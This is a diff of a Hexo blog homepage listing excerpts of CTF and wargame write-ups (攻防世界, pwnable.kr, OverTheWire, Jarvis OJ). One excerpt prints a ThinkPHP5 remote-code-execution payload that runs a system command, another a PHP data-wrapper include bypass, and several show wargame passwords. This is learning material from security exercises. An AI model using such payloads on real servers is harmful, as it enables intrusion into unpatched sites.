@@ -1,315 +1,247 @@
 <!DOCTYPE html>
-<!--[if lte IE 8 ]>
-<html class="ie" xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
-<![endif]-->
-<!--[if (gte IE 9)|!(IE)]><!-->
-<!--
-***************  *      *     *
-      8          *    *       *
-      8          *  *         *
-      8          **           *
-      8          *  *         *
-      8          *    *       *
-      8          *      *     *
-      8          *        *   ***********    -----Theme By Kieran(http://go.kieran.top)
--->
-<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-CN" lang="zh-CN">
-<!--<![endif]-->
+<html lang="en">
+
+
+
+
 
 <head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="description" content="">
+  <meta name="author" content="">
+  <meta name="keywords" content="">
   <title>Xiaotan</title>
-  <!-- Meta data -->
-    <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
-    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta name="generator" content="Xiaotan">
-    <meta name="author" content="">
-    <meta name="description" content="" />
-    <meta name="keywords" content="" />
 
-    <!-- Favicon, (keep icon in root folder) -->
-    <link rel="Shortcut Icon" href="/img/favicon.ico" type="image/ico">
+  <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css"  >
+<link rel="stylesheet" href="/lib/bootstrap/css/bootstrap.min.css"  >
+<link rel="stylesheet" href="/lib/mdbootstrap/css/mdb.min.css"  >
+<link rel="stylesheet" href="/lib/github-markdown/github-markdown.min.css"  >
 
-    <link rel="alternate" href="/atom.xml" title="Xiaotan" type="application/atom+xml">
-    <link rel="stylesheet" href="/css/all.css" media="screen" type="text/css">
-    
-    <link rel="stylesheet" href="/highlightjs/vs.css" type="text/css">
-    
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
 
-    <!--[if IE 8]>
-    <link rel="stylesheet" type="text/css" href="/css/ie8.css" />
-    <![endif]-->
 
-    <!-- jQuery | Load our jQuery, with an alternative source fallback to a local version if request is unavailable -->
-    <script src="/js/jquery-1.11.1.min.js"></script>
-    <script>window.jQuery || document.write('<script src="js/jquery-1.11.1.min.js"><\/script>')</script>
 
-    <!-- Load these in the <head> for quicker IE8+ load times -->
-    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
-    <!--[if lt IE 9]>
-    <script src="/js/html5shiv.min.js"></script>
-    <script src="/js/respond.min.js"></script>
-    <![endif]-->
+  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css"  >
 
-  
-  
-  <link rel="alternate" type="application/atom+xml" title="Atom 0.3" href="atom.xml">
-  
-  
+<link rel="stylesheet" href="/css/main.css"  >
 
-  <style>.col-md-8.col-md-offset-2.opening-statement img{display:none;}</style>
+
+  <link rel="stylesheet" href="/lib/fancybox/jquery.fancybox.min.css"  >
+
+
+<meta name="generator" content="Hexo 4.1.1"><link rel="alternate" href="/atom.xml" title="Xiaotan" type="application/atom+xml">
 </head>
 
-<!--
-<body class="home-template">
--->
-<body id="index" class="lightnav animsition">
 
-      <!-- ============================ Off-canvas navigation =========================== -->
+<body>
+  <header style="height: 100vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>小叹的博客</strong>&nbsp;</a>
 
-    <div class="sb-slidebar sb-right sb-style-overlay sb-momentum-scrolling">
-        <div class="sb-close" aria-label="Close Menu" aria-hidden="true">
-            <img src="/img/close.png" alt="Close"/>
-        </div>
-        <!-- Lists in Slidebars -->
-        <ul class="sb-menu">
-            <li><a href="/" class="animsition-link" title="Home">Home</a></li>
-            <li><a href="/archives" class="animsition-link" title="archive">archives</a></li>
-            <!-- Dropdown Menu -->
-			 
-            <li>
-                <a class="sb-toggle-submenu">Works<span class="sb-caret"></span></a>
-                <ul class="sb-submenu">
-                    
-                        <li><a href="/" target="_BLANK" class="animsition-link">AAA</a></li>
-                    
-                        <li><a href="/atom.xml" target="_BLANK" class="animsition-link">BBB</a></li>
-                    
-                </ul>
-            </li>
-            
-            
-        	<li>
-        		<a class="sb-toggle-submenu">Categories<span class="sb-caret"></span></a>
-            	<ul class="sb-submenu">
-				  	
-				    <li><a href="/categories/SQL注入/" class="animsition-link">SQL注入<small>(2)</small></a></li>
-				    
-				    <li><a href="/categories/WEB/" class="animsition-link">WEB<small>(4)</small></a></li>
-				    
-				    <li><a href="/categories/WEB，python/" class="animsition-link">WEB，python<small>(1)</small></a></li>
-				    
-				    <li><a href="/categories/pwn/" class="animsition-link">pwn<small>(4)</small></a></li>
-				    
-				    <li><a href="/categories/web/" class="animsition-link">web<small>(1)</small></a></li>
-				    
-				    <li><a href="/categories/攻防世界，web/" class="animsition-link">攻防世界，web<small>(3)</small></a></li>
-				    
-				</ul>
-        	</li>
-			
-            
-            <li>
-                <a class="sb-toggle-submenu">Links<span class="sb-caret"></span></a>
-                <ul class="sb-submenu">
-                    
-                    <li><a href="https://glotozz.github.io/" target="_blank" rel="noopener" class="animsition-link">glotozz</a></li>
-                    
-                </ul>
-            </li>
-            
-        </ul>
-        <!-- Lists in Slidebars -->
-        <ul class="sb-menu secondary">
-            
-            <li><a href="/about.html" class="animsition-link" title="about">About</a></li>
-            <li><a href="/atom.xml" class="animsition-link" title="rss">RSS</a></li>
-        </ul>
-    </div>
-    
-    <!-- ============================ END Off-canvas navigation =========================== -->
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
 
-    <!-- ============================ #sb-site Main Page Wrapper =========================== -->
-
-    <div id="sb-site">
-        <!-- #sb-site - All page content should be contained within this id, except the off-canvas navigation itself -->
-
-        <!-- ============================ Header & Logo bar =========================== -->
-
-        <div id="navigation" class="navbar navbar-fixed-top">
-            <div class="navbar-inner">
-                <div class="container">
-                    <!-- Nav logo -->
-                    <div class="logo">
-                        <a href="/" title="Logo" class="animsition-link">
-                         <img src="/img/logo.png" alt="Logo" width="35px;"/> 
-                        </a>
-                    </div>
-                    <!-- // Nav logo -->
-                    <!-- Info-bar -->
-                    <nav>
-                        <ul class="nav">
-                            <li><a href="/" class="animsition-link">Xiaotan</a></li>
-                            <li class="nolink"><span>Always </span>Creative.</li>
-                            
-                            <li><a href="https://github.com/" title="Github" target="_blank"><i class="icon-github"></i></a></li>
-                            
-                            
-                            <li><a href="https://twitter.com/" title="Twitter" target="_blank"><i class="icon-twitter"></i></a></li>
-                            
-                            
-                            <li><a href="https://www.facebook.com/" title="Facebook" target="_blank"><i class="icon-facebook"></i></a></li>
-                            
-                            
-                            <li><a href="https://google.com/" title="Google-Plus" target="_blank"><i class="icon-google-plus"></i></a></li>
-                            
-                            
-                            <li><a href="http://weibo.com/" title="Sina-Weibo" target="_blank"><i class="icon-sina-weibo"></i></a></li>
-                            
-                            <li class="nolink"><span>Welcome!</span></li>
-                        </ul>
-                    </nav>
-                    <!--// Info-bar -->
-                </div>
-                <!-- // .container -->
-                <div class="learnmore sb-toggle-right">More</div>
-                <button type="button" class="navbar-toggle menu-icon sb-toggle-right" title="More">
-                <span class="sr-only">Toggle navigation</span>
-                <span class="icon-bar before"></span>
-                <span class="icon-bar main"></span>
-                <span class="icon-bar after"></span>
-                </button>
-            </div>
-            <!-- // .navbar-inner -->
-        </div>
-
-        <!-- ============================ Header & Logo bar =========================== -->
-
-
-      <!-- ============================ Hero Image =========================== -->
-
-<section id="hero" class="scrollme">
-    <div class="container-fluid element-img" style="background: url(/img/bg_img.jpg) no-repeat center center fixed;background-size: cover">
-        <div class="row">
-            <div class="col-xs-12 col-sm-8 col-sm-offset-2 col-md-8 col-md-offset-2 vertical-align cover boost text-center">
-                <div class="center-me animateme" data-when="exit" data-from="0" data-to="0.6" data-opacity="0" data-translatey="100">
-                    <div>
-                        
-                        <h2>YOU'VE MADE A <span>BRAVE</span> DECISION, WELCOME.</h2>
-                        <p></p>
-                        
-                        <h2></h2>
-                        <p>每一个不曾起舞的日子都是对生命的辜负。</p>
-                        
-
-                    </div>
-                </div>
-            </div>
-            <!-- // .col-md-12 -->
-        </div>
-        <div class="herofade beige-dk"></div>
-    </div>
-</section>
-
-<!-- Height spacing helper -->
-<div class="heightblock"></div>
-<!-- // End height spacing helper -->
-
-<!-- ============================ END Hero Image =========================== -->
-<!-- ============================ Content =========================== -->
-
-<section id="intro">
-    <div class="container">
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
         
-        <div class="row">
-            <div class="col-md-8 col-md-offset-2 opening-statement">
-                <div class="col-md-4">
-                    <h3><a href="/2020/01/19/攻防世界高手进阶区PHP-rec/">攻防世界高手进阶区PHP_rec</a></h3>
-                    <span>
-                        <span class="post-meta">
-      <time datetime="2020-01-19T01:35:33.000Z" itemprop="datePublished">
-          2020-01-19
-      </time>
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">Home</a>
+          </li>
+        
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">Archives</a>
+          </li>
+        
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/categories/">Categories</a>
+          </li>
+        
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">Tags</a>
+          </li>
+        
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">About</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background"
+         style="background: url('/img/bg_img.jpg')no-repeat center center;
+           background-size: cover;
+           background-attachment: fixed;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+          </div>
+
+          
+            <div class="scroll-down-bar">
+              <i class="fas fa-angle-down scroll-down-arrow"></i>
+            </div>
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      <div class="container nopadding-md">
+        <div class="py-5 z-depth-3" id="board">
+          
+          <div class="container">
+            <div class="row">
+              <div class="col-12 col-md-10 m-auto">
+                
+
+
+  <div class="row mb-4 mx-auto">
     
     
-    | 
-    <a href='/tags/WEB，php/'>WEB，php</a>
-    
-    
-</span>
-                    </span>
-                </div>
-                <div class="col-md-8">
-                    <p>
-                      
-                        php_rec进去以后F12看源码，什么都没发现。用御剑扫描一波没发现什么。就直接搜索thinkphp5 rce漏洞,改一改payload就出了。
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/01/19/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6%E5%8C%BAPHP-rec/">
+        <p class="h4 index-header">攻防世界高手进阶区PHP_rec</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">php_rec进去以后F12看源码，什么都没发现。用御剑扫描一波没发现什么。就直接搜索thinkphp5 rce漏洞,改一改payload就出了。
 
 ?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20../../../flag
 
-
-                      
-                    </p>
-                    
-                    <p class="pull-right readMore">
-                        <a href="/2020/01/19/攻防世界高手进阶区PHP-rec/">Read More...</a>
-                    </p>
-                    
-                </div>
-                <div class="clearfix"></div>
-                <hr class="nogutter">
-            </div>
+</div>
         </div>
+      </a>
+
+      <div>
         
-        <div class="row">
-            <div class="col-md-8 col-md-offset-2 opening-statement">
-                <div class="col-md-4">
-                    <h3><a href="/2020/01/16/Linux下安装UPX/">Linux下安装UPX</a></h3>
-                    <span>
-                        <span class="post-meta">
-      <time datetime="2020-01-16T05:15:50.000Z" itemprop="datePublished">
-          2020-01-16
-      </time>
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-19&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%8Cweb">攻防世界，web</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/WEB%EF%BC%8Cphp">WEB，php</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
     
-</span>
-                    </span>
-                </div>
-                <div class="col-md-8">
-                    <p>
-                      
-                        upx 是一款压缩可执行文件的软件，压缩率在 20% 到 %70 之间。在可执行文件运行的时候并不需要解压软件，程序在内存中自动展开。
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/01/16/Linux%E4%B8%8B%E5%AE%89%E8%A3%85UPX/">
+        <p class="h4 index-header">Linux下安装UPX</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">upx 是一款压缩可执行文件的软件，压缩率在 20% 到 %70 之间。在可执行文件运行的时候并不需要解压软件，程序在内存中自动展开。
 本教程在 linux 下进行，理论上支持所有 linux 发型版。
 安装 upxupx 请从 upx 官网下载，不要用包管理器进下载。一般来说发行版默认源的软件比较老可能不支持比较新的语言生成的二进制文件，有压坏二进制的风险。
-本教程的下载地址可能不是最新版请访问 https://upx.github.
-                      
-                    </p>
-                    
-                    <p class="pull-right readMore">
-                        <a href="/2020/01/16/Linux下安装UPX/">Read More...</a>
-                    </p>
-                    
-                </div>
-                <div class="clearfix"></div>
-                <hr class="nogutter">
-            </div>
+本教程的下载地址可能不是最新版请访问 https://upx.github.io 下载最新版
+下载 upx
+
+
+
+wget https://github.com/upx/upx/releases/download/v3.95/upx-3.95-amd64_linux.tar.xz
+
+
+
+解压二进制
+
+
+
+tar -Jxf upx*.tar.xz
+
+
+
+为了方便使用移动 upx 到系统变量目录，如果不愿意使用 root 的话可以将 upx 目录添加到环境变量
+
+
+
+sudo cp upx*/upx /usr/bin
+
+
+
+然后就可以使用了
+</div>
         </div>
+      </a>
+
+      <div>
         
-        <div class="row">
-            <div class="col-md-8 col-md-offset-2 opening-statement">
-                <div class="col-md-4">
-                    <h3><a href="/2020/01/15/pwnable-kr解题（一）/">pwnable.kr解题（一）</a></h3>
-                    <span>
-                        <span class="post-meta">
-      <time datetime="2020-01-15T04:24:41.000Z" itemprop="datePublished">
-          2020-01-15
-      </time>
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-16&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
     
-</span>
-                    </span>
-                </div>
-                <div class="col-md-8">
-                    <p>
-                      
-                        fdssh fd@pwnable.kr -p2222 (pw:guest)
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/01/15/pwnable-kr%E8%A7%A3%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/">
+        <p class="h4 index-header">pwnable.kr解题（一）</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">fdssh fd@pwnable.kr -p2222 (pw:guest)
 fd@pwnable:~$ cat fd.c
 #include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
@@ -317,115 +249,122 @@ fd@pwnable:~$ cat fd.c
 char buf[32];
 int main(int argc, char* argv[], char* envp[]){
     if(argc&lt;2){
- 
-                      
-                    </p>
-                    
-                    <p class="pull-right readMore">
-                        <a href="/2020/01/15/pwnable-kr解题（一）/">Read More...</a>
-                    </p>
-                    
-                </div>
-                <div class="clearfix"></div>
-                <hr class="nogutter">
-            </div>
+        printf(&quot;pass argv[1] a number\n&quot;);
+        return 0;
+    }
+    int fd = atoi( argv[1] ) - 0x1234;
+    int len = 0;
+    len = read(fd, buf, 32);
+    if(!strcmp(&quot;LETMEWIN\n&quot;, buf)){
+        printf(&quot;good job :)\n&quot;);
+        system(&quot;/bin/cat </div>
         </div>
+      </a>
+
+      <div>
         
-        <div class="row">
-            <div class="col-md-8 col-md-offset-2 opening-statement">
-                <div class="col-md-4">
-                    <h3><a href="/2020/01/14/overthewire-narnia解题-一/">overthewire narnia解题(一)</a></h3>
-                    <span>
-                        <span class="post-meta">
-      <time datetime="2020-01-14T12:05:56.000Z" itemprop="datePublished">
-          2020-01-14
-      </time>
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-15&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
     
     
-    | 
-    <a href='/tags/pwn/'>pwn</a>
-    
-    
-</span>
-                    </span>
-                </div>
-                <div class="col-md-8">
-                    <p>
-                      
-                        level 0账号：narnia0 密码：narnia0SSH为narnia.labs.overthewire.orgas后narnia0，将目录更改为/narnia并运行ls -l。从输出中，我们可以看到我们具有的读取权限narnia0.c。我们还可以看到该资源narnia0归该narnia0组所有（通过运行我们可以看到它属于该组），并且我们对该组id拥有执行权限。此外，由于setuid位已设置（如的输出左侧所示），并且归所有者所有，
-                      
-                    </p>
-                    
-                    <p class="pull-right readMore">
-                        <a href="/2020/01/14/overthewire-narnia解题-一/">Read More...</a>
-                    </p>
-                    
-                </div>
-                <div class="clearfix"></div>
-                <hr class="nogutter">
-            </div>
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/01/14/overthewire-narnia%E8%A7%A3%E9%A2%98-%E4%B8%80/">
+        <p class="h4 index-header">overthewire narnia解题(一)</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">level 0账号：narnia0 密码：narnia0SSH为narnia.labs.overthewire.orgas后narnia0，将目录更改为/narnia并运行ls -l。从输出中，我们可以看到我们具有的读取权限narnia0.c。我们还可以看到该资源narnia0归该narnia0组所有（通过运行我们可以看到它属于该组），并且我们对该组id拥有执行权限。此外，由于setuid位已设置（如的输出左侧所示），并且归所有者所有，因此我们可以看到它narnia0可以作为narnia1用户执行。从输出中我们可以看到是x86 ELF二进制文件。似乎很清楚，那就是它的源代码，我们需要利用sls -lnarnia1file narnia0narnia0narnia0.cnarnia0narnia0以某种方式编写程序，这样我们就可以运行任意命令narnia1。运行cat narnia0.c给出以下输出。
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main(){
+    long val=0x41414141;
+    c</div>
         </div>
+      </a>
+
+      <div>
         
-        <div class="row">
-            <div class="col-md-8 col-md-offset-2 opening-statement">
-                <div class="col-md-4">
-                    <h3><a href="/2020/01/13/overthewire解题（二）/">overthewire解题（二）</a></h3>
-                    <span>
-                        <span class="post-meta">
-      <time datetime="2020-01-13T02:52:31.000Z" itemprop="datePublished">
-          2020-01-13
-      </time>
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-14&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/pwn">pwn</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/pwn">pwn</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
     
     
-    | 
-    <a href='/tags/pwn/'>pwn</a>
-    
-    
-</span>
-                    </span>
-                </div>
-                <div class="col-md-8">
-                    <p>
-                      
-                        level 13用账号：bandit13，密码：8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL进入本关
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/01/13/overthewire%E8%A7%A3%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/">
+        <p class="h4 index-header">overthewire解题（二）</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">level 13用账号：bandit13，密码：8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL进入本关
     bandit13@bandit:~$ ssh -i sshkey.private bandit14@localhost
     Could not create directory &#39;/home/bandit13/.ssh&#39;.
-    The authenticity of host &#39
-                      
-                    </p>
-                    
-                    <p class="pull-right readMore">
-                        <a href="/2020/01/13/overthewire解题（二）/">Read More...</a>
-                    </p>
-                    
-                </div>
-                <div class="clearfix"></div>
-                <hr class="nogutter">
-            </div>
+    The authenticity of host &#39;localhost (127.0.0.1)&#39; can&#39;t be established.
+    ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
+    Are you sure you want to continue connecting (yes/no)? yes
+    Failed to add the host to the list of known hosts (/home/bandit13/.ssh/known_h</div>
         </div>
+      </a>
+
+      <div>
         
-        <div class="row">
-            <div class="col-md-8 col-md-offset-2 opening-statement">
-                <div class="col-md-4">
-                    <h3><a href="/2020/01/12/overthewire解题（一）/">overthewire解题（一）</a></h3>
-                    <span>
-                        <span class="post-meta">
-      <time datetime="2020-01-12T02:37:25.000Z" itemprop="datePublished">
-          2020-01-12
-      </time>
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-13&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/pwn">pwn</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/pwn">pwn</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
     
     
-    | 
-    <a href='/tags/pwn/'>pwn</a>
-    
-    
-</span>
-                    </span>
-                </div>
-                <div class="col-md-8">
-                    <p>
-                      
-                        level 0直接lscat readme
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/01/12/overthewire%E8%A7%A3%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/">
+        <p class="h4 index-header">overthewire解题（一）</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">level 0直接lscat readme
 level 1pwd
 cat ./.-
 level 2关于转义字符可以用反斜杠进行转义。也可以用tab键。
@@ -446,114 +385,128 @@ koReBOKuIDDepwhWk7jZC0RTdopnAYKh
 
 
 
+level 5按照笨方法应该已经不能用了“ls -l”除文件名称外，亦将文件型态、权限、拥有者、文件大小等资讯详细列出，发现有很多文件夹，”find . -type f -size 1033c”，”.”查找当前目录以及子目录，-type f指定文件类型为普通文件，-size 1033c指定文件大小为 1033 bytes.密码：
 
-                      
-                    </p>
-                    
-                    <p class="pull-right readMore">
-                        <a href="/2020/01/12/overthewire解题（一）/">Read More...</a>
-                    </p>
-                    
-                </div>
-                <div class="clearfix"></div>
-                <hr class="nogutter">
-            </div>
+
+
+DXjZPULLxYr17uwoI01bNLQbtFemEgo7
+
+
+
+level 6grep（global search regular expression(RE) and print out the line，全面搜</div>
         </div>
+      </a>
+
+      <div>
         
-        <div class="row">
-            <div class="col-md-8 col-md-offset-2 opening-statement">
-                <div class="col-md-4">
-                    <h3><a href="/2020/01/11/Jarvis-OJ-神盾局的秘密/">Jarvis OJ 神盾局的秘密</a></h3>
-                    <span>
-                        <span class="post-meta">
-      <time datetime="2020-01-11T10:44:56.000Z" itemprop="datePublished">
-          2020-01-11
-      </time>
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-12&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/pwn">pwn</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/pwn">pwn</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
     
     
-    | 
-    <a href='/tags/WEB/'>WEB</a>,
-    
-    <a href='/tags/Jarvis-OJ/'>Jarvis OJ</a>
-    
-    
-</span>
-                    </span>
-                </div>
-                <div class="col-md-8">
-                    <p>
-                      
-                        神盾局的秘密题目链接：http://web.jarvisoj.com:32768/题目提示:
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/01/11/Jarvis-OJ-%E7%A5%9E%E7%9B%BE%E5%B1%80%E7%9A%84%E7%A7%98%E5%AF%86/">
+        <p class="h4 index-header">Jarvis OJ 神盾局的秘密</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">神盾局的秘密题目链接：http://web.jarvisoj.com:32768/题目提示:
 这里有个通向神盾局内部网络的秘密入口，你能通过漏洞发现神盾局的秘密吗？
-访问链接之后，得到就是一张图片，通过burp抓包，发现在中途访问了网址http://web.jarvisoj.com:32768/showimg.php?img=c2hpZWxkLnBocA==，看链接是一个文件读取，文件名是使用base64加密了。读取showimg.ph
-                      
-                    </p>
-                    
-                    <p class="pull-right readMore">
-                        <a href="/2020/01/11/Jarvis-OJ-神盾局的秘密/">Read More...</a>
-                    </p>
-                    
-                </div>
-                <div class="clearfix"></div>
-                <hr class="nogutter">
-            </div>
+访问链接之后，得到就是一张图片，通过burp抓包，发现在中途访问了网址http://web.jarvisoj.com:32768/showimg.php?img=c2hpZWxkLnBocA==，看链接是一个文件读取，文件名是使用base64加密了。读取showimg.php的内容:
+&lt;?php
+    $f = $_GET[&#39;img&#39;];
+    if (!empty($f)) {
+        $f = base64_decode($f);
+        if (stripos($f,&#39;..&#39;)===FALSE &amp;&amp; stripos($f,&#39;/&#39;)===FALSE &amp;&amp; stripos($f,&#39;\\&#39;)===FALSE
+        &amp;&amp; stripos($f,&#39;pctf&#39;)===</div>
         </div>
+      </a>
+
+      <div>
         
-        <div class="row">
-            <div class="col-md-8 col-md-offset-2 opening-statement">
-                <div class="col-md-4">
-                    <h3><a href="/2020/01/10/python模板注入/">python模板注入</a></h3>
-                    <span>
-                        <span class="post-meta">
-      <time datetime="2020-01-10T12:08:15.000Z" itemprop="datePublished">
-          2020-01-10
-      </time>
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-11&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/WEB">WEB</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/WEB">WEB</a>&nbsp;
+          
+            <a href="/tags/Jarvis%20OJ">Jarvis OJ</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
     
-</span>
-                    </span>
-                </div>
-                <div class="col-md-8">
-                    <p>
-                      
-                        https://www.freebuf.com/column/187845.html
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/01/10/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">
+        <p class="h4 index-header">python模板注入</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">https://www.freebuf.com/column/187845.html
 攻防世界中模板注入例题的wp:https://blog.csdn.net/qq_40884727/article/details/101605002
 https://blog.csdn.net/qq_17204441/article/details/102857726
-
-                      
-                    </p>
-                    
-                    <p class="pull-right readMore">
-                        <a href="/2020/01/10/python模板注入/">Read More...</a>
-                    </p>
-                    
-                </div>
-                <div class="clearfix"></div>
-                <hr class="nogutter">
-            </div>
+</div>
         </div>
+      </a>
+
+      <div>
         
-        <div class="row">
-            <div class="col-md-8 col-md-offset-2 opening-statement">
-                <div class="col-md-4">
-                    <h3><a href="/2019/12/28/攻防世界web进阶区/">攻防世界web进阶区Web_php_include</a></h3>
-                    <span>
-                        <span class="post-meta">
-      <time datetime="2019-12-28T04:42:36.000Z" itemprop="datePublished">
-          2019-12-28
-      </time>
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-10&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/WEB%EF%BC%8Cpython">WEB，python</a>&nbsp;
+          &nbsp;
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
     
     
-    | 
-    <a href='/tags/WEB，upload/'>WEB，upload</a>
-    
-    
-</span>
-                    </span>
-                </div>
-                <div class="col-md-8">
-                    <p>
-                      
-                        Web_php_include
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2019/12/28/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/">
+        <p class="h4 index-header">攻防世界web进阶区Web_php_include</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">Web_php_include
 strstr() 函数搜索字符串在另一字符串中的第一次出现。注释：该函数是二进制安全的。注释：该函数对大小写敏感。如需进行不区分大小写的搜索，请使用 stristr() 函数。
 那就利用大小写绕过输入：
 
@@ -566,42 +519,49 @@ strstr() 函数搜索字符串在另一字符串中的第一次出现。注释�
 直接访问flag发现一片空白。
 
 那就继续在burp里用cat命令访问，成功取得flag。
-事后观看其他人的思路还可以用data直接
-                      
-                    </p>
-                    
-                    <p class="pull-right readMore">
-                        <a href="/2019/12/28/攻防世界web进阶区/">Read More...</a>
-                    </p>
-                    
-                </div>
-                <div class="clearfix"></div>
-                <hr class="nogutter">
-            </div>
+事后观看其他人的思路还可以用data直接查看：
+
+
+?page=data:text/plain,
+
+
+或者麻烦一点用菜刀也可以做出来。
+</div>
         </div>
+      </a>
+
+      <div>
         
-        <div class="row">
